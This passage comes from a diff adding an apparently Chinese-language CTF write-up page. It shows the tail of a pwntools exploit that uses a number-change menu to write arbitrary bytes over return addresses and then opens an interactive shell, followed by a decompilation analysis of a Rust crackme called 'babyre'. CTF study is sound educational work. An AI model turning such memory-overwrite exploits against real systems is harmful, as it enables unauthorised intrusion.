+    <span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"3</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"which number to change:</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">off</span><span class="p">)</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"new number:</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">val</span><span class="p">)</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"5. exit</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">write_dword</span><span class="p">(</span><span class="n">off</span><span class="p">,</span> <span class="n">val</span><span class="p">):</span>
+    <span class="n">write_byte</span><span class="p">(</span><span class="n">off</span><span class="p">,</span> <span class="n">val</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span>
+    <span class="n">write_byte</span><span class="p">(</span><span class="n">off</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="p">(</span><span class="n">val</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span>
+    <span class="n">write_byte</span><span class="p">(</span><span class="n">off</span> <span class="o">+</span> <span class="mi">2</span><span class="p">,</span> <span class="p">(</span><span class="n">val</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span>
+    <span class="n">write_byte</span><span class="p">(</span><span class="n">off</span> <span class="o">+</span> <span class="mi">3</span><span class="p">,</span> <span class="p">(</span><span class="n">val</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">exit</span><span class="p">():</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"5</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+
+<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"How many numbers you have:</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"1</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Give me your numbers</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"1</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"5. exit</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+
+<span class="n">write_dword</span><span class="p">(</span><span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x8048450</span><span class="p">)</span>
+<span class="n">write_dword</span><span class="p">(</span><span class="mh">0x8C</span><span class="p">,</span> <span class="mh">0x8048980</span> <span class="o">+</span> <span class="mi">7</span><span class="p">)</span>
+<span class="nb">exit</span><span class="p">()</span>
+</code></pre></div>
+<h2 id="babyre">babyre</h2>
+
+<p>一个rust写的程序，通过特征字符串Google获得，之前也没有学过rust，也是第一次做rust逆向。</p>
+
+<p>动态调试看read调用时的栈帧，发现关键校验函数在<code class="prettyprint">critical_A110</code>，其中有3个transform。</p>
+<div class="highlight"><pre><code class="language-c" data-lang="c">  <span class="k">if</span> <span class="p">(</span> <span class="n">rust_strlen</span><span class="p">(</span><span class="o">&amp;</span><span class="n">a1</span><span class="p">)</span> <span class="o">==</span> <span class="mi">32</span> <span class="p">)</span> <span class="c1">//动态调试猜得是strlen
+</span>  <span class="p">{</span>
+    <span class="n">sub_D500</span><span class="p">(</span><span class="o">&amp;</span><span class="n">a1</span><span class="p">,</span> <span class="n">v4</span><span class="p">);</span>
+    <span class="n">sub_D250</span><span class="p">((</span><span class="kt">unsigned</span> <span class="n">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v25</span><span class="p">);</span>
+    <span class="n">sub_10D10</span><span class="p">((</span><span class="n">rust_str</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v25</span><span class="p">);</span>
+    <span class="n">sub_D250</span><span class="p">((</span><span class="kt">unsigned</span> <span class="n">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v23</span><span class="p">);</span>
+    <span class="n">v37</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="n">sub_D030</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v25</span><span class="p">);</span> <span class="c1">//前面这几个函数不重要
+</span>    <span class="n">v37</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">v28</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">v24</span><span class="p">;</span>
+    <span class="o">*</span><span class="p">(</span><span class="n">_OWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">v27</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_OWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v23</span><span class="p">;</span> <span class="c1">//这个相当于浅拷贝字符串
+</span>    <span class="n">fst_trans</span><span class="p">((</span><span class="n">__int64</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">v25</span><span class="p">.</span><span class="n">private_2</span> <span class="o">+</span> <span class="mi">1</span><span class="p">),</span> <span class="p">(</span><span class="k">struct</span> <span class="n">_Unwind_Exception</span> <span class="o">*</span><span class="p">)</span><span class="n">v27</span><span class="p">);</span>
+    <span class="c1">// 第二个参数是字符串src，第一个是dst字符串，用来放transform的结果
+</span>    <span class="c1">// 以此类推，后面类似
+</span>    <span class="n">a2</span><span class="p">.</span><span class="n">length</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">v26</span><span class="p">;</span>
+    <span class="o">*</span><span class="p">(</span><span class="n">_OWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">a2</span><span class="p">.</span><span class="n">p_str</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_OWORD</span> <span class="o">*</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">v25</span><span class="p">.</span><span class="n">private_2</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+    <span class="n">snd_trans</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v29</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">a2</span><span class="p">);</span>
+    <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">v34</span> <span class="o">=</span> <span class="n">v29</span><span class="p">.</span><span class="n">length</span><span class="p">;</span>
+    <span class="o">*</span><span class="p">(</span><span class="n">_OWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">v33</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_OWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v29</span><span class="p">.</span><span class="n">p_str</span><span class="p">;</span>
+    <span class="n">trd_trans</span><span class="p">((</span><span class="n">__int64</span><span class="p">)</span><span class="n">v31</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">_Unwind_Exception</span> <span class="o">*</span><span class="p">)</span><span class="n">v33</span><span class="p">);</span>
+    <span class="n">v36</span> <span class="o">=</span> <span class="n">v32</span><span class="p">;</span>
+    <span class="o">*</span><span class="p">(</span><span class="n">_OWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">v35</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_OWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">v31</span><span class="p">;</span>
+    <span class="n">sub_9F50</span><span class="p">((</span><span class="k">struct</span> <span class="n">_Unwind_Exception</span> <span class="o">*</span><span class="p">)</span><span class="n">v35</span><span class="p">);</span>
+    <span class="n">v37</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="p">}</span>
+</code></pre></div>
+<p>其中rust字符串结构体为</p>
+<div class="highlight"><pre><code class="language-assembly" data-lang="assembly">00000000 rust_str        struc
+00000000 p_str           dq ?
+00000008 length_not_sure dq ?
+00000010 length          dq ?
+00000018 rust_str        ends
+</code></pre></div>
+<p>大概是这样，不保证完全对。</p>
+
+<p>然后随便看一个trans的函数，其实都差不多，就是核心运算不一样</p>
+<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">__int64</span> <span class="kr">__fastcall</span> <span class="nf">snd_trans</span><span class="p">(</span><span class="n">rust_str</span> <span class="o">*</span><span class="n">dst</span><span class="p">,</span> <span class="n">rust_str</span> <span class="o">*</span><span class="n">src</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">_BYTE</span> <span class="o">*</span><span class="n">v2</span><span class="p">;</span> <span class="c1">// rax
+</span>  <span class="n">__int64</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// rdx
+</span>  <span class="n">_BYTE</span> <span class="o">*</span><span class="n">v4</span><span class="p">;</span> <span class="c1">// rax
+</span>  <span class="kt">char</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// STFF_1
+</span>  <span class="n">_BYTE</span> <span class="o">*</span><span class="n">v6</span><span class="p">;</span> <span class="c1">// rax
+</span>  <span class="kt">char</span> <span class="n">v7</span><span class="p">;</span> <span class="c1">// STB7_1
+</span>  <span class="n">_BYTE</span> <span class="o">*</span><span class="n">v8</span><span class="p">;</span> <span class="c1">// rax
+</span>  <span class="kt">char</span> <span class="n">v9</span><span class="p">;</span> <span class="c1">// ST6F_1
+</span>  <span class="n">_BYTE</span> <span class="o">*</span><span class="n">v10</span><span class="p">;</span> <span class="c1">// rax
+</span>  <span class="kt">char</span> <span class="n">v11</span><span class="p">;</span> <span class="c1">// ST27_1
+</span>  <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">v13</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-1D0h]
+</span>  <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">v14</span><span class="p">;</span> <span class="c1">// [rsp+40h] [rbp-1A8h]
+</span>  <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">v15</span><span class="p">;</span> <span class="c1">// [rsp+60h] [rbp-188h]
+</span>  <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">v16</span><span class="p">;</span> <span class="c1">// [rsp+88h] [rbp-160h]
+</span>  <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">v17</span><span class="p">;</span> <span class="c1">// [rsp+A8h] [rbp-140h]
+</span>  <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">v18</span><span class="p">;</span> <span class="c1">// [rsp+D0h] [rbp-118h]
+</span>  <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">v19</span><span class="p">;</span> <span class="c1">// [rsp+F0h] [rbp-F8h]
+</span>  <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">i_mul4</span><span class="p">;</span> <span class="c1">// [rsp+118h] [rbp-D0h]
+</span>  <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">v21</span><span class="p">;</span> <span class="c1">// [rsp+120h] [rbp-C8h]
+</span>  <span class="n">__int64</span> <span class="n">v22</span><span class="p">;</span> <span class="c1">// [rsp+168h] [rbp-80h]
+</span>  <span class="n">__int128</span> <span class="n">v23</span><span class="p">;</span> <span class="c1">// [rsp+170h] [rbp-78h]
+</span>  <span class="kt">int</span> <span class="n">v24</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span> <span class="c1">// [rsp+180h] [rbp-68h]
+</span>  <span class="n">__int64</span> <span class="n">v25</span><span class="p">;</span> <span class="c1">// [rsp+188h] [rbp-60h]
+</span>  <span class="n">__int64</span> <span class="n">v26</span><span class="p">;</span> <span class="c1">// [rsp+190h] [rbp-58h]
+</span>  <span class="n">__int64</span> <span class="n">v27</span><span class="p">;</span> <span class="c1">// [rsp+198h] [rbp-50h]
+</span>  <span class="kt">int</span> <span class="n">v28</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span> <span class="c1">// [rsp+1A0h] [rbp-48h]
+</span>  <span class="n">__int64</span> <span class="n">v29</span><span class="p">;</span> <span class="c1">// [rsp+1A8h] [rbp-40h]
+</span>  <span class="n">__int64</span> <span class="n">v30</span><span class="p">;</span> <span class="c1">// [rsp+1B0h] [rbp-38h]
+</span>  <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+1B8h] [rbp-30h]
+</span>  <span class="n">__int64</span> <span class="n">v32</span><span class="p">;</span> <span class="c1">// [rsp+1C0h] [rbp-28h]
+</span>  <span class="n">__int128</span> <span class="n">v33</span><span class="p">;</span> <span class="c1">// [rsp+1C8h] [rbp-20h]
+</span>
+  <span class="n">v2</span> <span class="o">=</span> <span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">sub_DF80</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+  <span class="o">*</span><span class="n">v2</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">v2</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">v2</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">v2</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">v2</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">v2</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">v2</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">v2</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">v2</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">v2</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">v2</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">v2</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">v2</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">v2</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">v2</span><span class="p">[</span><span class="mi">14</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">v2</span><span class="p">[</span><span class="mi">15</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">v2</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">v2</span><span class="p">[</span><span class="mi">17</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">v2</span><span class="p">[</span><span class="mi">18</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">v2</span><span class="p">[</span><span class="mi">19</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">v2</span><span class="p">[</span><span class="mi">20</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">v2</span><span class="p">[</span><span class="mi">21</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">v2</span><span class="p">[</span><span class="mi">22</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">v2</span><span class="p">[</span><span class="mi">23</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">v2</span><span class="p">[</span><span class="mi">24</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">v2</span><span class="p">[</span><span class="mi">25</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">v2</span><span class="p">[</span><span class="mi">26</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">v2</span><span class="p">[</span><span class="mi">27</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">v2</span><span class="p">[</span><span class="mi">28</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">v2</span><span class="p">[</span><span class="mi">29</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">v2</span><span class="p">[</span><span class="mi">30</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">v2</span><span class="p">[</span><span class="mi">31</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">sub_D270</span><span class="p">((</span><span class="n">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v22</span><span class="p">,</span> <span class="p">(</span><span class="n">__int64</span><span class="p">)</span><span class="n">v2</span><span class="p">,</span> <span class="mi">32LL</span><span class="p">);</span>
+  <span class="n">v26</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+  <span class="n">v27</span> <span class="o">=</span> <span class="mi">8LL</span><span class="p">;</span>
+  <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">v24</span> <span class="o">=</span> <span class="n">sub_10500</span><span class="p">(</span><span class="mi">0LL</span><span class="p">,</span> <span class="mi">8LL</span><span class="p">);</span>
+  <span class="n">v25</span> <span class="o">=</span> <span class="n">v3</span><span class="p">;</span>
+  <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">v28</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">v24</span><span class="p">;</span>
+  <span class="n">v29</span> <span class="o">=</span> <span class="n">v3</span><span class="p">;</span>
+  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">sub_103B0</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v30</span><span class="p">,</span> <span class="p">(</span><span class="n">__int64</span><span class="p">)</span><span class="n">v28</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">v30</span> <span class="p">)</span>
+      <span class="k">break</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">v30</span> <span class="o">!=</span> <span class="mi">1</span> <span class="p">)</span>
+      <span class="n">BUG</span><span class="p">();</span>
+    <span class="n">v21</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span> <span class="c1">//i的变化范围：0-7，看起来没初始化但是应该是通过其他某个指针初始化的（可能是个结构体成员）
+</span>      <span class="c1">//其实不用管那么多可以调试获得到这个信息
+</span>    <span class="n">i_mul4</span> <span class="o">=</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">i</span><span class="p">;</span><span class="c1">//4个一组做运算
+</span>    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">is_mul_ok</span><span class="p">(</span><span class="mi">4uLL</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span> <span class="p">)</span>
+      <span class="n">error</span><span class="p">((</span><span class="n">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">off_27A8B0</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">i_mul4</span> <span class="o">&gt;=</span> <span class="mh">0xFFFFFFFFFFFFFFFDLL</span> <span class="p">)</span>
+      <span class="n">error</span><span class="p">((</span><span class="n">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">off_27A900</span><span class="p">);</span>
+      <span class="c1">//这里还可以看到rust会检查整形溢出，有意思，不过会对速度大打折扣
+</span>    <span class="n">v4</span> <span class="o">=</span> <span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">idx_access</span><span class="p">(</span><span class="n">src</span><span class="p">,</span> <span class="p">((</span><span class="n">_BYTE</span><span class="p">)</span><span class="n">i_mul4</span> <span class="o">+</span> <span class="mi">3</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x1F</span><span class="p">);</span>
+      <span class="c1">//猜+调试，发现这个函数是idx的访问
+</span>      <span class="c1">//所以poyoten师傅的猜题技巧是真的牛逼
+</span>    <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="n">v4</span> <span class="o">&gt;=</span> <span class="mh">0x7Fu</span> <span class="p">)</span>
+      <span class="n">error</span><span class="p">((</span><span class="n">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">off_27A928</span><span class="p">);</span>
+    <span class="n">v19</span> <span class="o">=</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">v21</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">is_mul_ok</span><span class="p">(</span><span class="mi">4uLL</span><span class="p">,</span> <span class="n">v21</span><span class="p">)</span> <span class="p">)</span>
+      <span class="n">error</span><span class="p">((</span><span class="n">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">off_27A950</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">v19</span> <span class="o">&gt;=</span> <span class="mh">0xFFFFFFFFFFFFFFFDLL</span> <span class="p">)</span>
+      <span class="n">error</span><span class="p">((</span><span class="n">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">off_27A9A0</span><span class="p">);</span>
+    <span class="n">v5</span> <span class="o">=</span> <span class="o">*</span><span class="n">v4</span> <span class="o">-</span> <span class="mh">0x7F</span><span class="p">;</span> <span class="c1">//可以看到这是核心运算
+</span>    <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">sub_10E30</span><span class="p">((</span><span class="n">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v22</span><span class="p">,</span> <span class="p">((</span><span class="n">_BYTE</span><span class="p">)</span><span class="n">v19</span> <span class="o">+</span> <span class="mi">3</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x1F</span><span class="p">)</span> <span class="o">=</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">//这里，assign到dst上
+</span>    <span class="c1">//.....
+</span>    <span class="c1">//后面和另外一个函数的分析类似，所以不说了。。。
+</span>  <span class="p">}</span>
+  <span class="n">v32</span> <span class="o">=</span> <span class="n">v22</span><span class="p">;</span>
+  <span class="n">v33</span> <span class="o">=</span> <span class="n">v23</span><span class="p">;</span>
+  <span class="n">dst</span><span class="o">-&gt;</span><span class="n">p_str</span> <span class="o">=</span> <span class="n">v22</span><span class="p">;</span>
+  <span class="o">*</span><span class="p">(</span><span class="n">_OWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">dst</span><span class="o">-&gt;</span><span class="n">length_not_sure</span> <span class="o">=</span> <span class="n">v33</span><span class="p">;</span><span class="c1">//这里很明显是把结果拷贝到dst。。。
+</span>  <span class="n">sub_D030</span><span class="p">((</span><span class="k">struct</span> <span class="n">_Unwind_Exception</span> <span class="o">*</span><span class="p">)</span><span class="n">src</span><span class="p">);</span>
+  <span class="k">return</span> <span class="p">(</span><span class="n">__int64</span><span class="p">)</span><span class="n">dst</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>最后分析完发现第一个trans是打乱位置，第二个是做一些加减法，第三个是做左移右移。</p>
+
+<p>最后那个函数是关键校验，动态调试改eflags或者改al，可以发现第一个branch能输出正确信息，然后这里有一串神秘字节序列，这里再次猜想，题目是想让我们3次transform之后得到这个序列。（感觉越来越领悟到poyoten师傅的猜题神功了</p>
+<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="kr">__fastcall</span> <span class="nf">sub_9F50</span><span class="p">(</span><span class="k">struct</span> <span class="n">_Unwind_Exception</span> <span class="o">*</span><span class="n">a1</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">_BYTE</span> <span class="o">*</span><span class="n">v1</span><span class="p">;</span> <span class="c1">// rax
+</span>  <span class="k">struct</span> <span class="n">_Unwind_Exception</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [rsp+20h] [rbp-98h]
+</span>  <span class="kt">char</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [rsp+70h] [rbp-48h]
+</span>
+  <span class="n">v1</span> <span class="o">=</span> <span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">sub_DF80</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+  <span class="o">*</span><span class="n">v1</span> <span class="o">=</span> <span class="mi">218</span><span class="p">;</span>
+  <span class="n">v1</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">216</span><span class="p">;</span>
+  <span class="n">v1</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="mi">61</span><span class="p">;</span>
+  <span class="n">v1</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="mi">76</span><span class="p">;</span>
+  <span class="n">v1</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="mi">227</span><span class="p">;</span>
+  <span class="n">v1</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="mi">99</span><span class="p">;</span>
+  <span class="n">v1</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="o">-</span><span class="mi">105</span><span class="p">;</span>
+  <span class="n">v1</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">=</span> <span class="mi">61</span><span class="p">;</span>
+  <span class="n">v1</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="o">-</span><span class="mi">63</span><span class="p">;</span>
+  <span class="n">v1</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">=</span> <span class="mi">145</span><span class="p">;</span>
+  <span class="n">v1</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">=</span> <span class="o">-</span><span class="mi">105</span><span class="p">;</span>
+  <span class="n">v1</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">=</span> <span class="mi">14</span><span class="p">;</span>
+  <span class="n">v1</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">=</span> <span class="mi">227</span><span class="p">;</span>
+  <span class="n">v1</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span> <span class="o">=</span> <span class="mi">92</span><span class="p">;</span>
+  <span class="n">v1</span><span class="p">[</span><span class="mi">14</span><span class="p">]</span> <span class="o">=</span> <span class="o">-</span><span class="mi">115</span><span class="p">;</span>
+  <span class="n">v1</span><span class="p">[</span><span class="mi">15</span><span class="p">]</span> <span class="o">=</span> <span class="mi">126</span><span class="p">;</span>
+  <span class="n">v1</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="mi">91</span><span class="p">;</span>
+  <span class="n">v1</span><span class="p">[</span><span class="mi">17</span><span class="p">]</span> <span class="o">=</span> <span class="mi">145</span><span class="p">;</span>
+  <span class="n">v1</span><span class="p">[</span><span class="mi">18</span><span class="p">]</span> <span class="o">=</span> <span class="mi">111</span><span class="p">;</span>
+  <span class="n">v1</span><span class="p">[</span><span class="mi">19</span><span class="p">]</span> <span class="o">=</span> <span class="o">-</span><span class="mi">2</span><span class="p">;</span>
+  <span class="n">v1</span><span class="p">[</span><span class="mi">20</span><span class="p">]</span> <span class="o">=</span> <span class="o">-</span><span class="mi">37</span><span class="p">;</span>
